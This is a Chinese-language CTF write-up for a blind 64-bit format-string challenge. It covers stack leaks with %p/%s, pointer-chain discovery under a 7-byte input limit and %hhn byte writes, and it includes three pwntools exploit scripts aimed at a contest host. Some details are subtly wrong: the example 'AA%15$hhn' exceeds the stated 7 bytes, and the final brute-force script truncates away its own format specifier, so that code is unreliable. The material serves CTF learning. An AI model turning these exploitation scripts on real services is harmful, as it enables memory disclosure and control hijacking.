## 🛡️ ez-nc 战役总结：从“盲打”到“精准打击”

### 1. 第一阶段：开天眼（Blind Leak）

**核心逻辑：** 既然没附件，就把服务器内存当成附件来读。

- **学到了什么：** 64 位系统下，栈上存满了宝藏。通过 `%p` 找基址，通过 `%s` 找字符串。
- **反思：** 如果下次脚本没扫到东西，记得检查是不是被 `\n` 截断了，或者是偏移量跑得不够深（有时候环境变量在 200 开外）。

### 2. 第二阶段：找杠杆（Master-Slave Chain）

**核心逻辑：** 7 字节限制下，你无法自己造地址。你必须**“借力打力”**。

- **关键姿势：** 寻找 `栈 -> 栈` 的指针。
  - `arg15` 是你的**手（Master）**。
  - `arg45` 是你的**跳板（Slave）**。
  - 你通过修改 `arg45` 的内容，实际上是在制造一个你想要的**任意地址指针**。
- **总结：** 看到长度限制极短的格式化字符串漏洞，第一反应永远是 **找指针链**。

### 3. 第三阶段：极限操作（%hhn 的神力）

**核心逻辑：** 既然不能一次写 8 字节，就用单字节微调。

- **神来之笔：** `%hhn` 配合前面的填充字符，刚好能卡在 7 字节内（比如 `AA%15$hhn`）。这让你拥有了“修改世界”的能力，虽然一次只能改一点点，但配合循环爆破，足以改掉程序逻辑或劫持返回地址。

------

## 🚀 下一次遇到这种题，该怎么办？（Pwn 盲打清单）

当你面对一个只有一个 `nc` 地址和端口的题目时，请按这个清单操作：

### 第一步：测深度与宽度

- **测长度：** 狂敲 `A`，看它在哪断掉。像这题发现是 7 字节，立刻放弃构造复杂 Payload 的幻想。
- **测漏洞：** 输入 `%p%p%p`，看有没有地址出来。有，就是格式化字符串；没，就试 `A` 看看有没有 `Segmentation Fault`（溢出）。

### 第二步：工业化泄露

- 不要手动试！直接祭出你的第一个脚本：**全量 Leak 脚本**。
- 把 `%p` 和 `%s` 的结果存进文件。你要找的是：
  - `0x56...` 或 `0x55...`（程序基址 PIE）
  - `0x7f...`（Libc 基址）
  - `0x7ff...`（栈地址，用来找指针链）

### 第三步：寻找“死穴”

- **环境变量：** 很多动态题的 Flag 就在环境变量里，扫 `%s` 就能出。
- **程序逻辑：** 像这题，如果读不到文件，就想办法改掉 `if(is_admin)` 这种标志位。
- **GOT 表劫持：** 如果能改 8 字节，就把 `printf` 改成 `system`。

### 第四步：脚本为王

- **脚本能力 = 容错率**。像你刚才用的爆破脚本，人肉操作是不可能的。
- **沉淀模板：** 把这次的 Master-Slave 探测脚本存好，它是你以后打 64 位盲 Pwn 的传家宝。

------

**最后的一点感悟：** 你说“脚本的神力不是你的神力”，其实不对。**脚本是你的武器，而设计脚本逻辑的你才是那个剑客。** 能够意识到“7 字节无法布置地址”并转向“利用栈上已有指针”，这本身就是高级 Pwn 选手的直觉。

这次你用的是别人的脚本，下次你可以尝试自己把这三步合一，写一个通用的 **Blind Pwn 自动化框架**！

## 以下为脚本部分

### 1. 自动化偏移盲打测试

在没有任何二进制文件的情况下，我们首先使用 `%s` 遍历栈上的偏移量。这段脚本的目的是寻找内存中泄露的字符串（如环境变量、程序基址或隐藏的 Flag）。

```python
from pwn import *

# 配置环境参数
context(os='linux', arch='amd64', log_level='error')

print("[*] 开始进行 %s 盲打测试...")

for i in range(1, 100):
    try:
        p = remote('nc1.ctfplus.cn', 41826)
        p.recvuntil(b"download: ")
        
        # 构造 Payload
        payload = f"%{i}$s".encode()
        p.sendline(payload)
        
        resp = p.recvline()
        if b"not existed" in resp:
            extracted_str = resp.split(b" not existed")[0]
            if extracted_str != payload and len(extracted_str) > 0:
                print(f"[+] 发现隐藏数据 at %{i}$s : {extracted_str}")
        p.close()
    except:
        pass
```

### 2. 探测 Master-Slave（主从）指针链

由于输入长度被严格限制在 7 字节，我们无法在栈上布置 8 字节的 64 位地址。因此，必须寻找栈上现有的“指针指向指针”的结构（即指针链），利用已有的指针作为跳板。

```python
from pwn import *

# 关闭多余日志
context(os='linux', arch='amd64', log_level='error')

print("[*] 开始探测 Master-Slave 栈指针链...")

try:
    p = remote('nc1.ctfplus.cn', 41826)
    
    # 1. 向 arg15 指向的内存写入数字 1 
    # 原理：%c 打印1个字符，%15$n 将打印的字符数(1)写入 arg15 指向的地址
    # 长度刚好 7 个字符： %c%15$n
    payload = b"%c%15$n"
    p.recvuntil(b"Enter the filename to download: ")
    p.sendline(payload)
    p.recvline() # 接收服务端的报错回显

    print("[*] 已成功写入特征值 1，正在遍历栈寻找 Slave 偏移...")

    # 2. 遍历栈，看看哪个偏移量变成了 0x1
    found = False
    for i in range(30, 60): 
        p.recvuntil(b"Enter the filename to download: ")
        p.sendline(f"%{i}$p".encode())
        resp = p.recvline().decode(errors='ignore')
        
        # 如果某个位置的值变成了 0x1，说明我们找到了目标！
        if "0x1 " in resp or "0x1\n" in resp or resp.startswith("0x1 "):
            print(f"[+] BINGO! 发现 Slave 指针: arg15 成功指向了 arg{i}!")
            found = True
            break
            
    if not found:
        print("[-] 未在 30-60 范围内找到 Slave 指针，可能需要调整范围或测试 arg18。")

    p.close()
except EOFError:
    print("[-] 写入时程序崩溃，该指针可能指向了关键的返回地址！这也是个好消息。")

print("[*] 探测结束。")
```

### 3. 爆破主存

```python
from pwn import *

for i in range(256): # 遍历单字节的所有可能 (0-255)
    p = remote('nc1.ctfplus.cn', 41826)
    p.recvuntil(b"download: ")
    
    # 构造填充，使得总长度控制写入的值
    # 比如想写入 i，payload 就是 "A"*(i - 7) + "%15$hhn"
    # 但由于只有 7 字节限制，你只能通过控制 payload 本身的长度来微调
    payload = b"A" * (i % 8) + b"%15$hhn" 
    
    p.sendline(payload[:7]) # 严格遵守 7 字节
    p.recvuntil(b"download: ")
    p.sendline(b"%45$s") # 看看改完后的结果
    
    try:
        res = p.recvall(timeout=1)
        if b"flag" in res.lower() or b"CTF" in res:
            print(f"找到疑似内容！写入值为 {i}, 结果: {res}")
            break
    except:
        pass
    p.close()
```
